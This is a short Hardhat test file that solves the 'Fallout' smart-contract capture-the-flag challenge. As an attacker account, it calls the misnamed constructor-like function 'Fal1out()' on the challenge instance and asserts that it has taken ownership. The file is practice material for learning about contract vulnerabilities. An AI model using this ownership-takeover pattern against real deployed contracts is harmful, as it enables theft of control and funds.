import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { assert, expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";

const INSTANCE_ADDRESS = "0xB1cbe9cC7dE5821b2b77Bb697d0EF26F3679859e";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Fallout", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        contract = await ethers.getContractAt(
            "Fallout",
            INSTANCE_ADDRESS,
            owner
        )
    });

    it("Should solve the challenge", async function () {
        const initialOwner = await contract.owner();

        assert.notEqual(attacker.address, initialOwner);

        txn = await contract.connect(attacker).Fal1out();
        await txn.wait();

        const currentOwner = await contract.owner();

        assert.equal(attacker.address, currentOwner);
    });
});